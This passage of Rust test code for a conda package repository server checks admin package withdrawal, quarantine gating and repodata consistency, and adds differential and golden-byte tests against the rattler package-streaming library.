        assert!(!is_withdrawn(Some("released"), None, now));
        assert!(!is_withdrawn(Some("clean"), None, now));
        assert!(!is_withdrawn(Some("quarantined"), Some(past), now));
    }

    // -----------------------------------------------------------------------
    // The acceptance test: publish 2, withdraw 1, every variant serves the
    // other only, download is gated, the CEP-6 notice carries the reason.
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn withdraw_excludes_package_from_every_repodata_variant_and_gates_download() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let (_good_id, bad_id) = seed_pair(&fx).await;

        // Sanity: both packages are listed and downloadable before withdrawal.
        let (status, repodata) = get_json(&fx, "noarch/repodata.json").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(package_names(&repodata), vec![BAD, GOOD]);

        // Capture the pre-withdrawal CEP-16 shard hash for "bad": after
        // withdrawal this content-addressed URL must stop serving (#4059:
        // no stale path may serve the withdrawn version).
        let (idx_status, idx_body) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!(
                "/{}/noarch/repodata_shards.msgpack.zst",
                fx.repo_key
            )),
        )
        .await;
        assert_eq!(idx_status, StatusCode::OK);
        let idx_msgpack = zstd::decode_all(std::io::Cursor::new(&idx_body[..])).unwrap();
        let pre_index: serde_json::Value = rmp_serde::from_slice(&idx_msgpack).unwrap();
        let bad_shard_hash = pre_index["shards"]["bad"]
            .as_str()
            .expect("pre-withdrawal shard index must list bad")
            .to_string();
        assert!(pre_index["shards"]["good"].is_string());

        // Withdraw ONE package, with the reason an admin would give.
        let (status, body) = tdh::send(
            admin_router(&fx),
            delete_req(
                format!("/{}/noarch/{BAD}", fx.repo_key),
                Some("malicious upload reported by vendor"),
            ),
        )
        .await;
        assert_eq!(
            status,
            StatusCode::OK,
            "withdrawal must succeed: {}",
            String::from_utf8_lossy(&body)
        );

        // --- Every repodata variant serves the other package only ---------

        let repodata_body = {
            let (status, body) = tdh::send(
                fx.router_with_auth(router()),
                tdh::get(format!("/{}/noarch/repodata.json", fx.repo_key)),
            )
            .await;
            assert_eq!(status, StatusCode::OK);
            body
        };
        let repodata: serde_json::Value = serde_json::from_slice(&repodata_body).unwrap();
        assert_eq!(
            package_names(&repodata),
            vec![GOOD],
            "repodata.json must list only the surviving package"
        );
        let removed: Vec<&str> = repodata["removed"]
            .as_array()
            .into_iter()
            .flatten()
            .filter_map(|v| v.as_str())
            .collect();
        assert!(
            removed.contains(&BAD),
            "the withdrawn package must be named in repodata's removed array: {repodata}"
        );

        let (status, current) = get_json(&fx, "noarch/current_repodata.json").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(package_names(&current), vec![GOOD]);

        let (status, run_exports) = get_json(&fx, "noarch/run_exports.json").await;
        assert_eq!(status, StatusCode::OK);
        let re_packages: Vec<&str> = run_exports["packages"]
            .as_object()
            .into_iter()
            .flatten()
            .map(|(k, _)| k.as_str())
            .collect();
        assert_eq!(
            re_packages,
            vec![GOOD],
            "run_exports must drop the withdrawn package"
        );

        let (status, channeldata) = get_json(&fx, "channeldata.json").await;
        assert_eq!(status, StatusCode::OK);
        let cd_packages: Vec<&str> = channeldata["packages"]
            .as_object()
            .into_iter()
            .flatten()
            .map(|(k, _)| k.as_str())
            .collect();
        assert_eq!(
            cd_packages,
            vec!["good"],
            "channeldata must drop the withdrawn package"
        );

        // Compressed variants: same content, different coding.
        let (status, body) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/noarch/repodata.json.zst", fx.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let zst: serde_json::Value =
            serde_json::from_slice(&zstd::decode_all(std::io::Cursor::new(&body[..])).unwrap())
                .unwrap();
        assert_eq!(
            package_names(&zst),
            vec![GOOD],
            "repodata.json.zst is stale"
        );

        let (status, body) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/noarch/repodata.json.bz2", fx.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let bz2: serde_json::Value = {
            use std::io::Read;
            let mut out = Vec::new();
            bzip2::read::BzDecoder::new(&body[..])
                .read_to_end(&mut out)
                .unwrap();
            serde_json::from_slice(&out).unwrap()
        };
        assert_eq!(
            package_names(&bz2),
            vec![GOOD],
            "repodata.json.bz2 is stale"
        );

        // JLAP: the advertised `latest` hash must be the hash of the repodata
        // the server serves NOW — a stale JLAP would name the pre-withdrawal
        // document and a client holding it would keep the withdrawn package.
        let (status, jlap_body) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/noarch/repodata.json.jlap", fx.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let jlap_text = String::from_utf8(jlap_body.to_vec()).unwrap();
        let lines: Vec<&str> = jlap_text.lines().collect();
        let metadata: serde_json::Value = serde_json::from_str(lines[lines.len() - 2]).unwrap();
        let expected_latest = hex::encode(blake2_256(&repodata_body));
        assert_eq!(
            metadata["latest"].as_str().unwrap(),
            expected_latest,
            "JLAP must advertise the post-withdrawal repodata hash"
        );

        // CEP-16 sharded repodata: the index must no longer name "bad", and
        // its pre-withdrawal content-addressed shard URL must 404.
        let (idx_status, idx_body) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!(
                "/{}/noarch/repodata_shards.msgpack.zst",
                fx.repo_key
            )),
        )
        .await;
        assert_eq!(idx_status, StatusCode::OK);
        let idx_msgpack = zstd::decode_all(std::io::Cursor::new(&idx_body[..])).unwrap();
        let post_index: serde_json::Value = rmp_serde::from_slice(&idx_msgpack).unwrap();
        let shard_names: Vec<&str> = post_index["shards"]
            .as_object()
            .into_iter()
            .flatten()
            .map(|(k, _)| k.as_str())
            .collect();
        assert_eq!(
            shard_names,
            vec!["good"],
            "the shard index must drop the withdrawn package"
        );

        let (stale_status, _) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!(
                "/{}/noarch/shards/{bad_shard_hash}.msgpack.zst",
                fx.repo_key
            )),
        )
        .await;
        assert_eq!(
            stale_status,
            StatusCode::NOT_FOUND,
            "the pre-withdrawal shard URL must not keep serving the withdrawn package"
        );

        // --- Direct download is gated; the survivor is untouched ----------

        let (status, _) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/noarch/{BAD}", fx.repo_key)),
        )
        .await;
        assert_eq!(
            status,
            StatusCode::CONFLICT,
            "the withdrawn package's direct download must be quarantine-gated"
        );
        let (status, _) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/noarch/{GOOD}", fx.repo_key)),
        )
        .await;
        assert_eq!(
            status,
            StatusCode::OK,
            "the rest of the channel is untouched"
        );

        // --- CEP-6 notice with the reason reaches clients ------------------

        let (status, notices) = get_json(&fx, "notices.json").await;
        assert_eq!(status, StatusCode::OK);
        let arr = notices["notices"].as_array().expect("notices array");
        let notice = arr
            .iter()
            .find(|n| {
                n["message"]
                    .as_str()
                    .is_some_and(|m| m.contains(BAD) && m.contains("malicious upload"))
            })
            .unwrap_or_else(|| panic!("a CEP-6 notice must explain the withdrawal: {notices}"));
        assert_eq!(notice["level"], "warning");
        assert!(notice["id"].is_string() && notice["created_at"].is_string());

        // --- Auditable, not hard-deleted -----------------------------------

        let row: (bool, Option<String>, Option<String>) = sqlx::query_as(
            "SELECT is_deleted, quarantine_status, quarantine_reason FROM artifacts WHERE id = $1",
        )
        .bind(bad_id)
        .fetch_one(&fx.pool)
        .await
        .expect("withdrawn artifact row");
        assert!(!row.0, "withdrawal must not hard- or soft-delete the row");
        assert_eq!(row.1.as_deref(), Some("quarantined"));
        assert_eq!(
            row.2.as_deref(),
            Some("malicious upload reported by vendor"),
            "the withdrawal reason stays on the auditable row"
        );

        // --- Idempotent: a second withdrawal is a 200, not an error --------

        let (status, _) = tdh::send(
            admin_router(&fx),
            delete_req(format!("/{}/noarch/{BAD}", fx.repo_key), None),
        )
        .await;
        assert_eq!(status, StatusCode::OK, "withdrawal must be idempotent");

        fx.teardown().await;
    }

    /// Negative control for the repodata filter: an EXPIRED upload hold is
    /// downloadable again (the gate says so), so repodata must keep listing
    /// the package. If this failed, the filter would be over-broad rather
    /// than proven to mirror the download gate.
    #[tokio::test]
    async fn expired_upload_hold_stays_listed_and_downloadable() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let (good_id, _) = seed_pair(&fx).await;
        sqlx::query(
            "UPDATE artifacts SET quarantine_status = 'quarantined', \
             quarantine_until = NOW() - INTERVAL '5 minutes' WHERE id = $1",
        )
        .bind(good_id)
        .execute(&fx.pool)
        .await
        .expect("expire the hold");

        let (status, repodata) = get_json(&fx, "noarch/repodata.json").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(
            package_names(&repodata),
            vec![BAD, GOOD],
            "an expired hold must NOT exclude the package from repodata"
        );

        let (status, _) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/noarch/{GOOD}", fx.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);

        fx.teardown().await;
    }

    /// The purge endpoint sits behind the delete-scope + admin rails: an
    /// anonymous caller gets 401, an authenticated non-admin gets 403, and
    /// neither touches the channel.
    #[tokio::test]
    async fn withdraw_requires_authenticated_admin() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        seed_pair(&fx).await;

        let (anon_status, _) = tdh::send(
            fx.router_anon(router()),
            delete_req(format!("/{}/noarch/{BAD}", fx.repo_key), None),
        )
        .await;
        assert_eq!(anon_status, StatusCode::UNAUTHORIZED);

        let (user_status, _) = tdh::send(
            fx.router_with_auth(router()),
            delete_req(format!("/{}/noarch/{BAD}", fx.repo_key), None),
        )
        .await;
        assert_eq!(
            user_status,
            StatusCode::FORBIDDEN,
            "a non-admin must not withdraw packages"
        );

        let (status, repodata) = get_json(&fx, "noarch/repodata.json").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(
            package_names(&repodata),
            vec![BAD, GOOD],
            "rejected withdrawals must leave the channel untouched"
        );

        fx.teardown().await;
    }

    /// Blast-radius rail: the endpoint addresses exactly one artifact path —
    /// an unknown filename is a 404, never a wider match.
    #[tokio::test]
    async fn withdraw_unknown_filename_404s() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        seed_pair(&fx).await;

        let (status, _) = tdh::send(
            admin_router(&fx),
            delete_req(format!("/{}/noarch/nope-9.9-0.tar.bz2", fx.repo_key), None),
        )
        .await;
        assert_eq!(status, StatusCode::NOT_FOUND);

        fx.teardown().await;
    }
}

// ---------------------------------------------------------------------------
// #4040: differential harness against the rattler reference implementation.
//
// These tests pin the relationship between the hand-rolled conda container
// readers and `rattler_package_streaming` (the crate pixi/prefix.dev are
// built on), and the served-repodata byte contract the migration must not
// break. They pass BOTH before and after the swap: before, they document
// exactly what the hand-rolled code did; after, they prove the migrated code
// produces identical results.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod rattler_streaming_differential_tests {
    /// Build a `.conda` (v2) fixture: ZIP with `metadata.json` and an
    /// `info-*.tar.zst` carrying the given `info/` members.
    fn conda_v2_package(index_json: &serde_json::Value) -> Vec<u8> {
        let index_bytes = serde_json::to_vec(index_json).unwrap();

        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }
        let compressed_tar = zstd::encode_all(std::io::Cursor::new(&tar_buf), 3).unwrap();

        let mut zip_buf = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            writer.start_file("metadata.json", options).unwrap();
            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
            writer
                .start_file("info-pkg-1.0-build_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &compressed_tar).unwrap();
            writer.finish().unwrap();
        }
        zip_buf
    }

    /// Build a two-stream `.tar.bz2` fixture (the pbzip2/lbzip2 shape, #4067):
    /// one tar encoded as two independent bzip2 streams, with
    /// `info/index.json` entirely inside the SECOND stream.
    fn conda_v1_two_stream_package(index_json: &serde_json::Value) -> Vec<u8> {
        let index_bytes = serde_json::to_vec(index_json).unwrap();

        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            let filler = vec![b'f'; 2000];
            let mut header = tar::Header::new_gnu();
            header.set_size(filler.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/files", &filler[..])
                .unwrap();
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }

        let bz = |bytes: &[u8]| {
            let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
            std::io::Write::write_all(&mut enc, bytes).unwrap();
            enc.finish().unwrap()
        };
        let split = 512 + 2048;
        let mut package = bz(&tar_buf[..split]);
        package.extend_from_slice(&bz(&tar_buf[split..]));
        package
    }

    /// v2 (`.conda`) parity: our hand-rolled reader and the reference
    /// implementation must extract the same `info/index.json` bytes.
    #[test]
    fn rattler_reads_same_index_json_from_conda_v2_as_our_reader() {
        let index = serde_json::json!({
            "name": "test-pkg",
            "version": "1.0.0",
            "build": "py312_0",
            "build_number": 0,
            "depends": ["python >=3.12"],
            "subdir": "linux-64",
        });
        let package = conda_v2_package(&index);

        let rattler_bytes = rattler_package_streaming::seek::read_package_file_content(
            std::io::Cursor::new(&package),
            rattler_conda_types::package::CondaArchiveType::Conda,
            "info/index.json",
        )
        .expect("rattler must read info/index.json from a valid .conda");

        let ours = super::extract_conda_v2_metadata(&package)
            .expect("our reader must extract metadata from a valid .conda");
        let ours_index_bytes = serde_json::to_vec(&serde_json::json!({
            "name": ours["name"],
            "version": ours["version"],
            "build": ours["build"],
            "build_number": ours["build_number"],
            "depends": ours["depends"],
            "subdir": ours["subdir"],
        }))
        .unwrap();

        assert_eq!(
            serde_json::from_slice::<serde_json::Value>(&rattler_bytes).unwrap(),
            serde_json::from_slice::<serde_json::Value>(&ours_index_bytes).unwrap(),
            "rattler and our reader must see the same index.json content"
        );
    }

    /// v1 (`.tar.bz2`) multi-stream: the reference implementation uses the
    /// single-stream `bzip2::read::BzDecoder` and CANNOT read a
    /// pbzip2/lbzip2-written package whose `info/index.json` sits past the
    /// first stream boundary. This test pins that limitation: it is the
    /// evidence for keeping our `MultiBzDecoder` readers on the v1 path
    /// (#4067) instead of migrating them. If a future rattler release fixes
    /// this, the test goes red and the v1 migration can be revisited.
    #[test]
    fn rattler_cannot_read_two_stream_tar_bz2_and_we_can() {
        let index = serde_json::json!({
            "name": "testpkg",
            "version": "1.0.0",
            "build": "py310_0",
            "depends": [],
        });
        let package = conda_v1_two_stream_package(&index);

        let rattler_result = rattler_package_streaming::seek::read_package_file_content(
            std::io::Cursor::new(&package),
            rattler_conda_types::package::CondaArchiveType::TarBz2,
            "info/index.json",
        );
        assert!(
            rattler_result.is_err(),
            "rattler gained multi-stream bzip2 support — revisit migrating the v1 path (#4067)"
        );

        // Our reader (MultiBzDecoder) reads it fine — the behaviour the
        // two-stream path must keep.
        let ours = super::extract_conda_v1_metadata(&package)
            .expect("our MultiBzDecoder reader must read past the stream boundary");
        assert_eq!(ours["name"], "testpkg");
        assert_eq!(ours["version"], "1.0.0");
    }
}

/// #4040: served-repodata byte contract. Build a fixture channel through the
/// real upload pipeline (extraction -> storage -> repodata generation), then
/// assert the served `repodata.json` and `current_repodata.json` bytes match
/// the golden document captured from the pre-migration implementation
/// byte-for-byte. The repo key is random per fixture, so it is interpolated
/// into the golden template; everything else — key order, field presence,
/// value spelling — is asserted exactly.
#[cfg(test)]
mod repodata_byte_stability_tests {
    use crate::api::handlers::test_db_helpers as tdh;

    fn conda_v1_package(name: &str, version: &str, build: &str) -> Vec<u8> {
        let index = serde_json::json!({
            "name": name,
            "version": version,
            "build": build,
            "build_number": 0,
            "depends": ["python >=3.10"],
            "license": "MIT",
            "subdir": "noarch",
        });
        let index_bytes = serde_json::to_vec(&index).unwrap();

        let mut tar_data = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut tar_data);
            let mut header = tar::Header::new_gnu();
            header.set_path("info/index.json").unwrap();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append(&header, &index_bytes[..]).unwrap();
            builder.finish().unwrap();
        }

        let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
        std::io::Write::write_all(&mut enc, &tar_data).unwrap();
        enc.finish().unwrap()
    }

    fn conda_v2_package(name: &str, version: &str, build: &str) -> Vec<u8> {
        let index = serde_json::json!({
            "name": name,
            "version": version,
            "build": build,
            "build_number": 1,
            "depends": ["python >=3.12", "zlib >=1.2.13,<1.3.0a0"],
            "constrains": ["zlib <1.2.12"],
            "license": "BSD-3-Clause",
            "subdir": "linux-64",
        });
        let index_bytes = serde_json::to_vec(&index).unwrap();

        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }
        let compressed_tar = zstd::encode_all(std::io::Cursor::new(&tar_buf), 3).unwrap();

        let mut zip_buf = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            // Pin the entry timestamp: the zip default is the wall clock,
            // which would make the fixture's checksums nondeterministic and
            // the golden assertion below impossible.
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored)
                .last_modified_time(zip::DateTime::default());
            writer.start_file("metadata.json", options).unwrap();
            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
            writer
                .start_file("info-pkg-1.0-build_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &compressed_tar).unwrap();
            writer.finish().unwrap();
        }
        zip_buf
    }

    async fn upload(fx: &tdh::Fixture, subdir: &str, filename: &str, body: Vec<u8>) {
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!("/{}/upload", fx.repo_key))
            .header("X-Conda-Subdir", subdir)
            .header("X-Package-Filename", filename)
            .body(axum::body::Body::from(body))
            .unwrap();
        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "fixture upload of {filename} failed: {status} {}",
            String::from_utf8_lossy(&resp)
        );
    }

    async fn get_bytes(fx: &tdh::Fixture, suffix: &str) -> bytes::Bytes {
        let (status, body) = tdh::send(
            fx.router_with_auth(super::router()),
            tdh::get(format!("/{}/{suffix}", fx.repo_key)),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "GET {suffix}");
        body
    }

    /// Golden documents captured from the PRE-MIGRATION implementation
    /// (#4040). `{key}` is interpolated with the fixture's random repo key;
    /// every other byte — pretty-print layout, key order, field presence,
    /// value spelling, the stored checksums of the deterministic fixture
    /// packages — is asserted exactly. A migration that changes served
    /// repodata bytes trips this test and must be justified in the PR.
    const GOLDEN_NOARCH: &str = r#"{
  "info": {
    "base_url": "/conda/{key}/noarch/",
    "subdir": "noarch"
  },
  "packages": {
    "zlib-1.2.13-hd590300_5.tar.bz2": {
      "build": "hd590300_5",
      "build_number": 0,
      "constrains": [],
      "depends": [
        "python >=3.10"
      ],
      "fn": "zlib-1.2.13-hd590300_5.tar.bz2",
      "license": "MIT",
      "md5": "171767ec5672ea594e1ef29d1211f3d7",
      "name": "zlib",
      "sha256": "2afa994d506a49f05cbbe00fd76c42992f7f26f66520d5083ecb7459cbcfac27",
      "size": 222,
      "subdir": "noarch",
      "version": "1.2.13"
    }
  },
  "packages.conda": {},
  "removed": [],
  "repodata_version": 1
}"#;

    const GOLDEN_LINUX64: &str = r#"{
  "info": {
    "base_url": "/conda/{key}/linux-64/",
    "subdir": "linux-64"
  },
  "packages": {},
  "packages.conda": {
    "rattlerpy-0.4.1-py312h02b7e37_1.conda": {
      "build": "py312h02b7e37_1",
      "build_number": 1,
      "constrains": [
        "zlib <1.2.12"
      ],
      "depends": [
        "python >=3.12",
        "zlib >=1.2.13,<1.3.0a0"
      ],
      "fn": "rattlerpy-0.4.1-py312h02b7e37_1.conda",
      "license": "BSD-3-Clause",
      "md5": "9f2993fb3eeeebbb9128a5c6b6b537d4",
      "name": "rattlerpy",
      "sha256": "ca5792b5733e64ca5de5776440792fd6b531ed9b2ded6a928a82682646d71a55",
      "size": 523,
      "subdir": "linux-64",
      "version": "0.4.1"
    }
  },
  "removed": [],
  "repodata_version": 1
}"#;

    fn golden(template: &str, key: &str) -> Vec<u8> {
        template.replace("{key}", key).into_bytes()
    }

    #[tokio::test]
    async fn served_repodata_bytes_match_pre_migration_golden() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };

        upload(
            &fx,
            "noarch",
            "zlib-1.2.13-hd590300_5.tar.bz2",
            conda_v1_package("zlib", "1.2.13", "hd590300_5"),
        )
        .await;
        upload(
            &fx,
            "linux-64",
            "rattlerpy-0.4.1-py312h02b7e37_1.conda",
            conda_v2_package("rattlerpy", "0.4.1", "py312h02b7e37_1"),
        )
        .await;

        let noarch = get_bytes(&fx, "noarch/repodata.json").await;
        let linux64 = get_bytes(&fx, "linux-64/repodata.json").await;
        let current = get_bytes(&fx, "linux-64/current_repodata.json").await;
        let key = fx.repo_key.clone();
        fx.teardown().await;

        assert_eq!(
            noarch,
            golden(GOLDEN_NOARCH, &key),
            "noarch/repodata.json bytes changed"
        );
        assert_eq!(
            linux64,
            golden(GOLDEN_LINUX64, &key),
            "linux-64/repodata.json bytes changed"
        );
        // One version per name here, so current_repodata is the same document.
        assert_eq!(
            current,
            golden(GOLDEN_LINUX64, &key),
            "linux-64/current_repodata.json bytes changed"
        );
    }
}
